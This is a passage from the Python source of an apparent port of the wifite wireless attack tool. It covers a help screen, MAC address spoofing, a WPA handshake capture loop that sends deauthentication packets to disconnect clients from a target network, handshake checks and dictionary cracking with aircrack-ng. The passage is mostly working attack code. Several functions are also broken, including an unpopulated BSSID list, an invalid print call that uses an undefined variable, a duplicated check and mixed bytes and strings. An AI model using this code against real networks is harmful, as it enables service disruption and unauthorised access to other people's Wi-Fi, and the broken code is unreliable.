        Prints help screen
    """

    head = W
    sw = G
    var = GR
    des = W
    de = G

    print(head + '   COMMANDS' + W)
    print(sw + '\t-check ' + var + '<file>\t' + des + 'check capfile ' + var + '<file>' + des + ' for handshakes.' + W)
    print(sw + '\t-cracked    \t' + des + 'display previously-cracked access points' + W)
    print(sw + '\t-recrack    \t' + des + 'allow recracking of previously cracked access points' + W)
    print('')

    print(head + '   GLOBAL' + W)
    print(sw + '\t-all         \t' + des + 'attack all targets.              ' + de + '[off]' + W)
    #print sw+'\t-pillage     \t'+des+'attack all targets in a looping fashion.'+de+'[off]'+W
    print(sw + '\t-i ' + var + '<iface>  \t' + des + 'wireless interface for capturing ' + de + '[auto]' + W)
    print(sw + '\t-mon-iface ' + var + '<monitor_interface>  \t' + des + 'interface in monitor mode for capturing ' + de + '[auto]' + W)
    print(sw + '\t-mac         \t' + des + 'anonymize mac address            ' + de + '[off]' + W)
    print(sw + '\t-c ' + var + '<channel>\t' + des + 'channel to scan for targets      ' + de + '[auto]' + W)
    print(sw + '\t-e ' + var + '<essid>  \t' + des + 'target a specific access point by ssid (name)  ' + de + '[ask]' + W)
    print(sw + '\t-b ' + var + '<bssid>  \t' + des + 'target a specific access point by bssid (mac)  ' + de + '[auto]' + W)
    print(sw + '\t-showb       \t' + des + 'display target BSSIDs after scan               ' + de + '[off]' + W)
    print(sw + '\t-pow ' + var + '<db>   \t' + des + 'attacks any targets with signal strenghth > ' + var + 'db ' + de + '[0]' + W)
    print(sw + '\t-quiet       \t' + des + 'do not print list of APs during scan           ' + de + '[off]' + W)
    print('')

    print(head + '\n   WPA' + W)
    print(sw + '\t-wpa        \t' + des + 'only target WPA networks (works with -wps -wep)   ' + de + '[off]' + W)
    print(sw + '\t-wpat ' + var + '<sec>   \t' + des + 'time to wait for WPA attack to complete (seconds) ' + de + '[500]' + W)
    print(sw + '\t-wpadt ' + var + '<sec>  \t' + des + 'time to wait between sending deauth packets (sec) ' + de + '[10]' + W)
    print(sw + '\t-strip      \t' + des + 'strip handshake using tshark or pyrit             ' + de + '[off]' + W)
    print(sw + '\t-crack ' + var + '<dic>\t' + des + 'crack WPA handshakes using ' + var + '<dic>' + des + ' wordlist file    ' + de + '[off]' + W)
    print(sw + '\t-dict ' + var + '<file>\t' + des + 'specify dictionary to use when cracking WPA ' + de + '[phpbb.txt]' + W)
    print(sw + '\t-aircrack   \t' + des + 'verify handshake using aircrack ' + de + '[on]' + W)
    print(sw + '\t-pyrit      \t' + des + 'verify handshake using pyrit    ' + de + '[off]' + W)
    print(sw + '\t-tshark     \t' + des + 'verify handshake using tshark   ' + de + '[on]' + W)
    print(sw + '\t-cowpatty   \t' + des + 'verify handshake using cowpatty ' + de + '[off]' + W)

    print(head + '\n   WEP' + W)
    print(sw + '\t-wep        \t' + des + 'only target WEP networks ' + de + '[off]' + W)
    print(sw + '\t-pps ' + var + '<num>  \t' + des + 'set the number of packets per second to inject ' + de + '[600]' + W)
    print(sw + '\t-wept ' + var + '<sec> \t' + des + 'sec to wait for each attack, 0 implies endless ' + de + '[600]' + W)
    print(sw + '\t-chopchop   \t' + des + 'use chopchop attack      ' + de + '[on]' + W)
    print(sw + '\t-arpreplay  \t' + des + 'use arpreplay attack     ' + de + '[on]' + W)
    print(sw + '\t-fragment   \t' + des + 'use fragmentation attack ' + de + '[on]' + W)
    print(sw + '\t-caffelatte \t' + des + 'use caffe-latte attack   ' + de + '[on]' + W)
    print(sw + '\t-p0841      \t' + des + 'use -p0841 attack        ' + de + '[on]' + W)
    print(sw + '\t-hirte      \t' + des + 'use hirte (cfrag) attack ' + de + '[on]' + W)
    print(sw + '\t-nofakeauth \t' + des + 'stop attack if fake authentication fails    ' + de + '[off]' + W)
    print(sw + '\t-wepca ' + GR + '<n>  \t' + des + 'start cracking when number of ivs surpass n ' + de + '[10000]' + W)
    print(sw + '\t-wepsave    \t' + des + 'save a copy of .cap files to this directory ' + de + '[off]' + W)

    print(head + '\n   WPS' + W)
    print(sw + '\t-wps       \t' + des + 'only target WPS networks         ' + de + '[off]' + W)
    print(sw + '\t-wpst ' + var + '<sec>  \t' + des + 'max wait for new retry before giving up (0: never)  ' + de + '[660]' + W)
    print(sw + '\t-wpsratio ' + var + '<per>\t' + des + 'min ratio of successful PIN attempts/total tries    ' + de + '[0]' + W)
    print(sw + '\t-wpsretry ' + var + '<num>\t' + des + 'max number of retries for same PIN before giving up ' + de + '[0]' + W)

    print(head + '\n   EXAMPLE' + W)
    print(sw + '\t./wifite.py ' + W + '-wps -wep -c 6 -pps 600' + W)
    print('')


###########################
# WIRELESS CARD FUNCTIONS #
###########################




######################
# SCANNING FUNCTIONS #
######################





def wps_check_targets(targets, cap_file, verbose=True):
    """
        Uses tshark to check access points in cap_file for WPS functionality.
        Sets "wps" field of targets that match to True.
    """
    global RUN_CONFIG

    if not program_exists('tshark'):
        RUN_CONFIG.WPS_DISABLE = True  # Tell 'scan' we were unable to execute tshark
        return

    if len(targets) == 0 or not os.path.exists(cap_file): return

    if verbose:
        print(GR + ' [+]' + W + ' checking for ' + G + 'WPS compatibility' + W + '...', end=' ')
        stdout.flush()

    cmd = [
        'tshark',
        '-r', cap_file, # Path to cap file
        '-n', # Don't resolve addresses
        # Filter WPS broadcast packets
        '-Y', 'wps.wifi_protected_setup_state && wlan.da == ff:ff:ff:ff:ff:ff',
        '-T', 'fields', # Only output certain fields
        '-e', 'wlan.ta', # BSSID
        '-e', 'wps.ap_setup_locked', # Locked status
        '-E', 'separator=,' # CSV
    ]
    proc_tshark = Popen(cmd, stdout=PIPE, stderr=DN)
    proc_tshark.wait()
    tshark_stdout, _ = proc_tshark.communicate()
    tshark_stdout_str = tshark_stdout.decode('utf-8')
    bssid_regex = re.compile(r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})')

    bssids = []  # Define an empty list to store BSSIDs
    for t in targets:
        if t.bssid.upper() in bssids:
            t.wps = True
        if verbose:
            print('done')
            removed = 0
    if not RUN_CONFIG.WPS_DISABLE and RUN_CONFIG.WPA_DISABLE:
        i = 0
        while i < len(targets):
            if not targets[i].wps and targets[i].encryption.find('WPA') != -1:
                removed += 1
                targets.pop(i)
            else:
                i += 1
        if removed > 0 and verbose: print(GR + ' [+]' + O + ' removed %d non-WPS-enabled targets%s' % (removed, W))


def print_and_exec(cmd):
    """
        Prints and executes command "cmd". Also waits half a second
        Used by rtl8187_fix (for prettiness)
    """
    print('\r                                                        \r', end=' ')
    stdout.flush()
    print(O + ' [!] ' + W + 'executing: ' + O + ' '.join(cmd) + W, end=' ')
    stdout.flush()
    call(cmd, stdout=DN, stderr=DN)
    time.sleep(0.1)


####################
# HELPER FUNCTIONS #
####################

def remove_airodump_files(prefix):
    """
        Removes airodump output files for whatever file prefix ('wpa', 'wep', etc)
        Used by wpa_get_handshake() and attack_wep()
    """
    global RUN_CONFIG
    remove_file(prefix + '-01.cap')
    remove_file(prefix + '-01.csv')
    remove_file(prefix + '-01.kismet.csv')
    remove_file(prefix + '-01.kismet.netxml')
    for filename in os.listdir(RUN_CONFIG.temp):
        if filename.lower().endswith('.xor'): remove_file(RUN_CONFIG.temp + filename)
    for filename in os.listdir('.'):
        if filename.startswith('replay_') and filename.endswith('.cap'):
            remove_file(filename)
        if filename.endswith('.xor'): remove_file(filename)
    # Remove .cap's from previous attack sessions
    """i = 2
    while os.path.exists(temp + 'wep-' + str(i) + '.cap'):
        os.remove(temp + 'wep-' + str(i) + '.cap')
        i += 1
    """


def remove_file(filename):
    """
        Attempts to remove a file. Does not throw error if file is not found.
    """
    try:
        os.remove(filename)
    except OSError:
        pass


def program_exists(program):
    """
        Uses 'which' (linux command) to check if a program is installed.
    """

    proc = Popen(['which', program], stdout=PIPE, stderr=PIPE)
    txt = proc.communicate()
    if txt[0].strip() == '' and txt[1].strip() == '':
        return False
    if txt[0].strip() != '' and txt[1].strip() == '':
        return True

    return not (txt[1].strip() == '' or txt[1].find(bytes('no %s in' % program, 'utf-8')) != -1)

def sec_to_hms(sec):
    """
        Converts integer sec to h:mm:ss format
    """
    if sec <= -1: return '[endless]'
    h = sec / 3600
    sec %= 3600
    m = sec / 60
    sec %= 60
    return '[%d:%02d:%02d]' % (h, m, sec)


def send_interrupt(process):
    """
        Sends interrupt signal to process's PID.
    """
    try:
        os.kill(process.pid, SIGINT)
        # os.kill(process.pid, SIGTERM)
    except OSError:
        pass  # process cannot be killed
    except TypeError:
        pass  # pid is incorrect type
    except UnboundLocalError:
        pass  # 'process' is not defined
    except AttributeError:
        pass  # Trying to kill "None"


def get_mac_address(iface):
    """
        Returns MAC address of "iface".
    """
    proc = Popen(['ifconfig', iface], stdout=PIPE, stderr=DN)
    proc.wait()
    mac = ''
    output = proc.communicate()[0]
    mac_regex = ('[a-zA-Z0-9]{2}-' * 6)[:-1]
    match = re.search(b' (%s)' % mac_regex.encode('utf-8'), output)
    if match:
        mac = match.groups()[0].replace(b'-', b':')
    return mac


def generate_random_mac(old_mac):
    """
        Generates a random MAC address.
        Keeps the same vender (first 6 chars) of the old MAC address (old_mac).
        Returns string in format old_mac[0:9] + :XX:XX:XX where X is random hex
    """
    random.seed()
    new_mac = old_mac[:8].lower().replace('-', ':')
    for i in range(0, 6):
        if i % 2 == 0: new_mac += ':'
        new_mac += '0123456789abcdef'[random.randint(0, 15)]

    # Prevent generating the same MAC address via recursion.
    if new_mac == old_mac:
        new_mac = generate_random_mac(old_mac)
    return new_mac


def mac_anonymize(iface):
    """
        Changes MAC address of 'iface' to a random MAC.
        Only randomizes the last 6 digits of the MAC, so the vender says the same.
        Stores old MAC address and the interface in ORIGINAL_IFACE_MAC
    """
    global RUN_CONFIG
    if RUN_CONFIG.DO_NOT_CHANGE_MAC: return
    if not program_exists('ifconfig'): return

    # Store old (current) MAC address
    proc = Popen(['ifconfig', iface], stdout=PIPE, stderr=DN)
    proc.wait()
    for word in proc.communicate()[0].split('\n')[0].split(' '):
        if word != '': old_mac = word
    RUN_CONFIG.ORIGINAL_IFACE_MAC = (iface, old_mac)

    new_mac = generate_random_mac(old_mac)

    call(['ifconfig', iface, 'down'])

    print(GR + " [+]" + W + " changing %s's MAC from %s to %s..." % (G + iface + W, G + old_mac + W, O + new_mac + W), end=' ')
    stdout.flush()

    proc = Popen(['ifconfig', iface, 'hw', 'ether', new_mac], stdout=PIPE, stderr=DN)
    proc.wait()
    call(['ifconfig', iface, 'up'], stdout=DN, stderr=DN)
    print('done')


def mac_change_back():
    """
        Changes MAC address back to what it was before attacks began.
    """
    global RUN_CONFIG
    iface = RUN_CONFIG.ORIGINAL_IFACE_MAC[0]
    old_mac = RUN_CONFIG.ORIGINAL_IFACE_MAC[1]
    if iface == '' or old_mac == '': return

    print(GR + " [+]" + W + " changing %s's mac back to %s..." % (G + iface + W, G + old_mac + W), end=' ')
    stdout.flush()

    call(['ifconfig', iface, 'down'], stdout=DN, stderr=DN)
    proc = Popen(['ifconfig', iface, 'hw', 'ether', old_mac], stdout=PIPE, stderr=DN)
    proc.wait()
    call(['ifconfig', iface, 'up'], stdout=DN, stderr=DN)
    print("done")


def get_essid_from_cap(bssid, capfile):
    """
        Attempts to get ESSID from cap file using BSSID as reference.
        Returns '' if not found.
    """
    if not program_exists('tshark'): return ''

    cmd = ['tshark',
           '-r', capfile,
           '-R', 'wlan.fc.type_subtype == 0x05 && wlan.sa == %s' % bssid,
           '-2', # -R is deprecated and requires -2
           '-n']
    proc = Popen(cmd, stdout=PIPE, stderr=DN)
    proc.wait()
    for line in proc.communicate()[0].split('\n'):
        if line.find('SSID=') != -1:
            essid = line[line.find('SSID=') + 5:]
            print(GR + ' [+]' + W + ' guessed essid: %s' % (G + essid + W))
            return essid
    print(R + ' [!]' + O + ' unable to guess essid!' + W)
    return ''


def get_bssid_from_cap(essid, capfile):
    """
        Returns first BSSID of access point found in cap file.
        This is not accurate at all, but it's a good guess.
        Returns '' if not found.
    """
    global RUN_CONFIG

    if not program_exists('tshark'): return ''

    # Attempt to get BSSID based on ESSID
    if essid != '':
        cmd = ['tshark',
               '-r', capfile,
               '-R', 'wlan_mgt.ssid == "%s" && wlan.fc.type_subtype == 0x05' % (essid),
               '-2', # -R is deprecated and requires -2
               '-n',  # Do not resolve MAC vendor names
               '-T', 'fields',  # Only display certain fields
               '-e', 'wlan.sa']  # souce MAC address
        proc = Popen(cmd, stdout=PIPE, stderr=DN)
        proc.wait()
        bssid = proc.communicate()[0].split('\n')[0]
        if bssid != '': return bssid

    cmd = ['tshark',
           '-r', capfile,
           '-R', 'eapol',
           '-2', # -R is deprecated and requires -2
           '-n']
    proc = Popen(cmd, stdout=PIPE, stderr=DN)
    proc.wait()
    for line in proc.communicate()[0].split('\n'):
        if line.endswith('Key (msg 1/4)') or line.endswith('Key (msg 3/4)'):
            while line.startswith(' ') or line.startswith('\t'): line = line[1:]
            line = line.replace('\t', ' ')
            while line.find('  ') != -1: line = line.replace('  ', ' ')
            return line.split(' ')[2]
        elif line.endswith('Key (msg 2/4)') or line.endswith('Key (msg 4/4)'):
            while line.startswith(' ') or line.startswith('\t'): line = line[1:]
            line = line.replace('\t', ' ')
            while line.find('  ') != -1: line = line.replace('  ', ' ')
            return line.split(' ')[4]
    return ''


def attack_interrupted_prompt():
    """
        Promps user to decide if they want to exit,
        skip to cracking WPA handshakes,
        or continue attacking the remaining targets (if applicable).
        returns True if user chose to exit complete, False otherwise
    """
    global RUN_CONFIG
    should_we_exit = False
    # If there are more targets to attack, ask what to do next
    if RUN_CONFIG.TARGETS_REMAINING > 0:
        options = ''
        print(GR + "\n [+] %s%d%s target%s remain%s" % (G, RUN_CONFIG.TARGETS_REMAINING, W,
                                                        '' if RUN_CONFIG.TARGETS_REMAINING == 1 else 's',
                                                        's' if RUN_CONFIG.TARGETS_REMAINING == 1 else ''))
        print(GR + " [+]" + W + " What do you want to do?")
        options += G + 'c' + W
        print(G + "     [c]ontinue" + W + " Attacking targets")

        if len(RUN_CONFIG.WPA_CAPS_TO_CRACK) > 0:
            options += W + ', ' + O + 's' + W
            print(O + "     [s]kip" + W + " to cracking WPA cap files")
        options += W + ', or ' + R + 'e' + W
        print(R + "     [e]xit" + W + " completely")
        ri = ''
        while ri != 'c' and ri != 's' and ri != 'e':
            ri = input(GR + ' [+]' + W + ' Please make a selection (%s): ' % options)

        if ri == 's':
            RUN_CONFIG.TARGETS_REMAINING = -1  # Tells start() to ignore other targets, skip to cracking
        elif ri == 'e':
            should_we_exit = True
    return should_we_exit


#
# Abstract base class for attacks.
# Attacks are required to implement the following methods:
#       RunAttack - Initializes the attack
#       EndAttack - Cleanly ends the attack
#
class Attack(object, metaclass=abc.ABCMeta):
    @abc.abstractmethod
    def RunAttack(self):
        raise NotImplementedError()

    @abc.abstractmethod
    def EndAttack(self):
        raise NotImplementedError()


#################
# WPA FUNCTIONS #
#################
class WPAAttack(Attack):
    def __init__(self, iface, target, clients, config):
        self.iface = iface
        self.clients = clients
        self.target = target
        self.RUN_CONFIG = config

    def RunAttack(self):
        '''
            Abstract method for initializing the WPA attack
        '''
        self.wpa_get_handshake()

    def EndAttack(self):
        '''
            Abstract method for ending the WPA attack
        '''
        pass

    def wpa_get_handshake(self):
        """
            Opens an airodump capture on the target, dumping to a file.
            During the capture, sends deauthentication packets to the target both as
            general deauthentication packets and specific packets aimed at connected clients.
            Waits until a handshake is captured.
                "iface"   - interface to capture on
                "target"  - Target object containing info on access point
                "clients" - List of Client objects associated with the target
            Returns True if handshake was found, False otherwise
        """

        if self.RUN_CONFIG.WPA_ATTACK_TIMEOUT <= 0: self.RUN_CONFIG.WPA_ATTACK_TIMEOUT = -1

        # Generate the filename to save the .cap file as <SSID>_aa-bb-cc-dd-ee-ff.cap
        save_as = self.RUN_CONFIG.WPA_HANDSHAKE_DIR + os.sep + re.sub(r'[^a-zA-Z0-9]', '', self.target.ssid) \
                  + '_' + self.target.bssid.replace(':', '-') + '.cap'

        # Check if we already have a handshake for this SSID... If we do, generate a new filename
        save_index = 0
        while os.path.exists(save_as):
            save_index += 1
            save_as = self.RUN_CONFIG.WPA_HANDSHAKE_DIR + os.sep + re.sub(r'[^a-zA-Z0-9]', '', self.target.ssid) \
                      + '_' + self.target.bssid.replace(':', '-') \
                      + '_' + str(save_index) + '.cap'

        file_prefix = os.path.join(self.RUN_CONFIG.temp, 'wpa')
        cap_file = file_prefix + '-01.cap'
        csv_file = file_prefix + '-01.csv'

        # Remove previous airodump output files (if needed)
        remove_airodump_files(file_prefix)

        # Start of large Try-Except; used for catching keyboard interrupt (Ctrl+C)
        try:
            # Start airodump-ng process to capture handshakes
            cmd = ['airodump-ng',
                   '-w', file_prefix,
                   '-c', self.target.channel,
                   '--write-interval', '1',
                   '--bssid', self.target.bssid,
                   self.iface]
            proc_read = Popen(cmd, stdout=DN, stderr=DN)

            # Setting deauthentication process here to avoid errors later on
            proc_deauth = None

            print(' %s Starting %sWPA Handshake Capture%s on "%s"' % \
                  (GR + sec_to_hms(self.RUN_CONFIG.WPA_ATTACK_TIMEOUT) + W, G, W, G + self.target.ssid + W))
            got_handshake = False

            seconds_running = 0
            seconds_since_last_deauth = 0

            target_clients = self.clients[:]
            client_index = -1
            start_time = time.time()
            # Deauth and check-for-handshake loop
            while not got_handshake and (
                    self.RUN_CONFIG.WPA_ATTACK_TIMEOUT <= 0 or seconds_running < self.RUN_CONFIG.WPA_ATTACK_TIMEOUT):
                if proc_read.poll() != None:
                    print("")
                    print("airodump-ng exited with status " + str(proc_read.poll()))
                    print("")
                    break
                time.sleep(1)
                seconds_since_last_deauth += int(time.time() - start_time - seconds_running)
                seconds_running = int(time.time() - start_time)

                print("                                                          \r", end=' ')
                print_green(' %s Listening for Handshake...\r' % target.ssid
                      (GR + sec_to_hms(self.RUN_CONFIG.WPA_ATTACK_TIMEOUT - seconds_running) + W), end=' ')
                stdout.flush()

                if seconds_since_last_deauth > self.RUN_CONFIG.WPA_DEAUTH_TIMEOUT:
                    seconds_since_last_deauth = 0
                    # Send deauth packets via aireplay-ng
                    cmd = ['aireplay-ng',
                           '--ignore-negative-one',
                           '--deauth',
                           str(self.RUN_CONFIG.WPA_DEAUTH_COUNT),  # Number of packets to send
                           '-a', self.target.bssid]

                    client_index += 1

                    if client_index == -1 or len(target_clients) == 0 or client_index >= len(target_clients):
                        print_green(" %s Sending %s Deauth To %s*Broadcast*%s..." % \
                              (GR + sec_to_hms(self.RUN_CONFIG.WPA_ATTACK_TIMEOUT - seconds_running) + W,
                               G + str(self.RUN_CONFIG.WPA_DEAUTH_COUNT) + W, G, W), end=' ')
                        client_index = -1
                    else:
                        print_green(" %s Sending %s Deauth To %s... " % \
                              (GR + sec_to_hms(self.RUN_CONFIG.WPA_ATTACK_TIMEOUT - seconds_running) + W, \
                               G + str(self.RUN_CONFIG.WPA_DEAUTH_COUNT) + W, \
                               G + target_clients[client_index].bssid + W), end=' ')
                        cmd.append('-c')
                        cmd.append(target_clients[client_index].bssid)
                    cmd.append(self.iface)
                    stdout.flush()

                    # Send deauth packets via aireplay, wait for them to complete.
                    proc_deauth = Popen(cmd, stdout=DN, stderr=DN)
                    proc_deauth.wait()
                    print("sent\r", end=' ')
                    stdout.flush()

                # Copy current dump file for consistency
                if not os.path.exists(cap_file): continue
                temp_cap_file = cap_file + '.temp'
                copy(cap_file, temp_cap_file)

                # Save copy of cap file (for debugging)
                #remove_file('/root/new/wpa-01.cap')
                #copy(temp + 'wpa-01.cap', '/root/new/wpa-01.cap')

                # Check for handshake
                if self.has_handshake(self.target, temp_cap_file):
                    got_handshake = True

                    try:
                        os.mkdir(self.RUN_CONFIG.WPA_HANDSHAKE_DIR + os.sep)
                    except OSError:
                        pass

                    # Kill the airodump and aireplay processes
                    send_interrupt(proc_read)
                    send_interrupt(proc_deauth)

                    # Save a copy of the handshake
                    rename(temp_cap_file, save_as)

                    print('\n %s %sHandshake Captured%s! Saved as "%s"' % (
                    GR + sec_to_hms(seconds_running) + W, G, W, G + save_as + W))
                    self.RUN_CONFIG.WPA_FINDINGS.append(
                        '%s (%s) Handshake Captured' % (self.target.ssid, self.target.bssid))
                    self.RUN_CONFIG.WPA_FINDINGS.append('Saved as %s' % (save_as))
                    self.RUN_CONFIG.WPA_FINDINGS.append('')

                    # Strip handshake if needed
                    if self.RUN_CONFIG.WPA_STRIP_HANDSHAKE: self.strip_handshake(save_as)

                    # Add the filename and SSID to the list of 'to-crack'
                    # Cracking will be handled after all attacks are finished.
                    self.RUN_CONFIG.WPA_CAPS_TO_CRACK.append(CapFile(save_as, self.target.ssid, self.target.bssid))

                    break  # Break out of while loop

                # No handshake yet
                os.remove(temp_cap_file)

                # Check the airodump output file for new clients
                for client in self.RUN_CONFIG.RUN_ENGINE.parse_csv(csv_file)[1]:
                    if client.station != self.target.bssid: continue
                    new_client = True
                    for c in target_clients:
                        if client.bssid == c.bssid:
                            new_client = False
                            break

                    if new_client:
                        print_green(" %s %sNew Client%s Found: %s                         " % \
                              (GR + sec_to_hms(self.RUN_CONFIG.WPA_ATTACK_TIMEOUT - seconds_running) + W, G, W, \
                               G + client.bssid + W))
                        target_clients.append(client)

            # End of Handshake wait loop.

            if not got_handshake:
                print_red(R + ' [0:00:00]' + O + ' Unable to Capture Handshake in Time' + W)

        except KeyboardInterrupt:
            print_red(R + '\n (^C)' + O + ' WPA Handshake Capture Interrupted' + W)
            if attack_interrupted_prompt():
                remove_airodump_files(file_prefix)
                send_interrupt(proc_read)
                send_interrupt(proc_deauth)
                print('')
                self.RUN_CONFIG.exit_gracefully(0)


        # clean up
        remove_airodump_files(file_prefix)
        send_interrupt(proc_read)
        send_interrupt(proc_deauth)

        return got_handshake

    def has_handshake_tshark(self, target, capfile):
        """
            Uses TShark to check for a handshake.
            Returns "True" if handshake is found, false otherwise.
        """
        if program_exists('tshark'):
            # Call Tshark to return list of EAPOL packets in cap file.
            cmd = ['tshark',
                   '-r', capfile,  # Input file
                   '-R', 'eapol',  # Filter (only EAPOL packets)
                   '-2', # -R is deprecated and requires -2
                   '-n']  # Do not resolve names (MAC vendors)
            proc = Popen(cmd, stdout=PIPE, stderr=DN)
            proc.wait()
            lines = proc.communicate()[0].split(b'\n')


            # Get list of all clients in cap file
            clients = []
            for line in lines:
                if line.find(b'Appears to have been cut short') != -1 or line.find(b'Running as user "root"') != -1 or line.strip() == b'':
                    continue

                while line.startswith(' '):  line = line[1:]
                while line.find('  ') != -1: line = line.replace('  ', ' ')

                fields = line.split(' ')
                # ensure tshark dumped correct info
                if len(fields) < 5:
                    continue

                src = fields[2].lower()
                dst = fields[4].lower()

                if src == target.bssid.lower() and clients.count(dst) == 0:
                    clients.append(dst)
                elif dst == target.bssid.lower() and clients.count(src) == 0:
                    clients.append(src)

            # Check each client for a handshake
            for client in clients:
                msg_num = 1  # Index of message in 4-way handshake (starts at 1)

                for line in lines:
                    if line.find('Appears to have been cut short') != -1: continue
                    if line.find('Running as user "root"') != -1: continue
                    if line.strip() == '': continue

                    # Sanitize tshark's output, separate into fields
                    while line[0] == ' ': line = line[1:]
                    while line.find('  ') != -1: line = line.replace('  ', ' ')

                    fields = line.split(' ')

                    # Sometimes tshark doesn't display the full header for "Key (msg 3/4)" on the 3rd handshake.
                    # This catches this glitch and fixes it.
                    if len(fields) < 8:
                        continue
                    elif len(fields) == 8:
                        fields.append('(msg')
                        fields.append('3/4)')

                    src = fields[2].lower()  # Source MAC address
                    dst = fields[4].lower()  # Destination MAC address
                    if len(fields) == 12:
                        # "Message x of y" format
                        msg = fields[9][0]
                    else:
                        msg = fields[-1][0]

                    # First, third msgs in 4-way handshake are from the target to client
                    if msg_num % 2 == 1 and (src != target.bssid.lower() or dst != client):
                        continue
                    # Second, fourth msgs in 4-way handshake are from client to target
                    elif msg_num % 2 == 0 and (dst != target.bssid.lower() or src != client):
                        continue

                    # The messages must appear in sequential order.
                    try:
                        if int(msg) != msg_num: continue
                    except ValueError:
                        continue

                    msg_num += 1

                    # We need the first 4 messages of the 4-way handshake
                    # Although aircrack-ng cracks just fine with only 3 of the messages...
                    if msg_num >= 4:
                        return True
        return False

    def has_handshake_cowpatty(self, target, capfile, nonstrict=True):
        """
            Uses cowpatty to check for a handshake.
            Returns "True" if handshake is found, false otherwise.
        """
        if not program_exists('cowpatty'): return False

        # Call cowpatty to check if capfile contains a valid handshake.
        cmd = ['cowpatty',
               '-r', capfile,  # input file
               '-s', target.ssid,  # SSID
               '-c']  # Check for handshake
        # Uses frames 1, 2, or 3 for key attack
        if nonstrict: cmd.append('-2')
        proc = Popen(cmd, stdout=PIPE, stderr=DN)
        proc.wait()
        response = proc.communicate()[0]
        if response.find('Incomplete four-way handshake exchange') != -1:
            return False
        elif response.find('Unsupported or unrecognized pcap file.') != -1:
            return False
        elif response.find('Unable to open capture file: Success') != -1:
            return False
        return True

    def has_handshake_pyrit(self, target, capfile):
        """
            Uses pyrit to check for a handshake.
            Returns "True" if handshake is found, false otherwise.
        """
        if not program_exists('pyrit'): return False

        # Call pyrit to "Analyze" the cap file's handshakes.
        cmd = ['pyrit',
               '-r', capfile,
               'analyze']
        proc = Popen(cmd, stdout=PIPE, stderr=DN)
        proc.wait()
        hit_essid = False
        for line in proc.communicate()[0].split('\n'):
            # Iterate over every line of output by Pyrit
            if line == '' or line == None: continue
            if line.find("AccessPoint") != -1:
                hit_essid = (line.find("('" + target.ssid + "')") != -1) and \
                            (line.lower().find(target.bssid.lower()) != -1)
                #hit_essid = (line.lower().find(target.bssid.lower()))

            else:
                # If Pyrit says it's good or workable, it's a valid handshake.
                if hit_essid and (line.find(', good, ') != -1 or line.find(', good*, ') != -1 or line.find(', workable, ') != -1):
                    return True
        return False

    def has_handshake_aircrack(self, target, capfile):
        """
            Uses aircrack-ng to check for handshake.
            Returns True if found, False otherwise.
        """
        if not program_exists('aircrack-ng'): return False
        crack = 'echo "" | aircrack-ng -a 2 -w - -b ' + target.bssid + ' ' + capfile
        proc_crack = Popen(crack, stdout=PIPE, stderr=DN, shell=True)
        proc_crack.wait()
        txt = proc_crack.communicate()[0]

        return (txt.find('Passphrase not in dictionary') != -1)

    def has_handshake(self, target, capfile):
        """
            Checks if .cap file contains a handshake.
            Returns True if handshake is found, False otherwise.
        """
        valid_handshake = True
        tried = False
        if self.RUN_CONFIG.WPA_HANDSHAKE_TSHARK:
            tried = True
            valid_handshake = self.has_handshake_tshark(target, capfile)

        if valid_handshake and self.RUN_CONFIG.WPA_HANDSHAKE_COWPATTY:
            tried = True
            valid_handshake = self.has_handshake_cowpatty(target, capfile)

        # Use CowPatty to check for handshake.
        if valid_handshake and self.RUN_CONFIG.WPA_HANDSHAKE_COWPATTY:
            tried = True
            valid_handshake = self.has_handshake_cowpatty(target, capfile)

        # Check for handshake using Pyrit if applicable
        if valid_handshake and self.RUN_CONFIG.WPA_HANDSHAKE_PYRIT:
            tried = True
            valid_handshake = self.has_handshake_pyrit(target, capfile)

        # Check for handshake using aircrack-ng
        if valid_handshake and self.RUN_CONFIG.WPA_HANDSHAKE_AIRCRACK:
            tried = True
            valid_handshake = self.has_handshake_aircrack(target, capfile)

        if tried: return valid_handshake
        print(R + ' [!]' + O + ' Unable to Check for Handshake: All Handshake Options Are Disabled!')
        self.RUN_CONFIG.exit_gracefully(1)

    def strip_handshake(self, capfile):
        """
            Uses Tshark or Pyrit to strip all non-handshake packets from a .cap file
            File in location 'capfile' is overwritten!
        """
        output_file = capfile
        if program_exists('pyrit'):
            cmd = ['pyrit',
                   '-r', capfile,
                   '-o', capfile + '.temp',
                   'stripLive']
            call(cmd, stdout=DN, stderr=DN)
            if os.path.exists(capfile + '.temp'):
                rename(capfile + '.temp', output_file)

        elif program_exists('tshark'):
            # strip results with tshark
            cmd = ['tshark',
                   '-r', capfile,  # input file
                   '-R', 'eapol || wlan_mgt.tag.interpretation',  # filter
                   '-2', # -R is deprecated and requires -2
                   '-w', capfile + '.temp']  # output file
            proc_strip = call(cmd, stdout=DN, stderr=DN)

            rename(capfile + '.temp', output_file)

        else:
            print(R + " [!]" + O + " unable to strip .cap file: neither pyrit nor tshark were found" + W)


##########################
# WPA CRACKING FUNCTIONS #
##########################
def wpa_crack(capfile, RUN_CONFIG):
    """
        Cracks cap file using aircrack-ng
        This is crude and slow. If people want to crack using pyrit or cowpatty or oclhashcat,
        they can do so manually.
    """
    if RUN_CONFIG.WPA_DICTIONARY == '':
        print_red(R + ' [!]' + O + ' No WPA Dictionary Found! Use -dict <file> Command-Line Argument' + W)
        return False

    print(GR + ' [0:00:00]' + W + ' Cracking %s with %s' % (G + capfile.ssid + W, G + 'aircrack-ng' + W))
    start_time = time.time()
    cracked = False

    remove_file(RUN_CONFIG.temp + 'out.out')
    remove_file(RUN_CONFIG.temp + 'wpakey.txt')

    cmd = ['aircrack-ng',
           '-a', '2',  # WPA crack
           '-w', RUN_CONFIG.WPA_DICTIONARY,  # Wordlist
           '-l', RUN_CONFIG.temp + 'wpakey.txt',  # Save key to file
           '-b', capfile.bssid,  # BSSID of target
           capfile.filename]

    proc = Popen(cmd, stdout=open(RUN_CONFIG.temp + 'out.out', 'a'), stderr=DN)
    try:
        kt = 0  # Keys tested
        kps = 0  # Keys per second
        while True:
            time.sleep(1)

            if proc.poll() != None:  # aircrack stopped
                if os.path.exists(RUN_CONFIG.temp + 'wpakey.txt'):
                    # Cracked
                    inf = open(RUN_CONFIG.temp + 'wpakey.txt')
                    key = inf.read().strip()
                    inf.close()
                    RUN_CONFIG.WPA_FINDINGS.append('Cracked WPS Key For "%s" (%s): "%s"' % (
                    G + capfile.ssid + W, G + capfile.bssid + W, C + key + W))
                    RUN_CONFIG.WPA_FINDINGS.append('')
                    t = Target(capfile.bssid, 0, 0, 0, 'WPA', capfile.ssid)
                    t.key = key
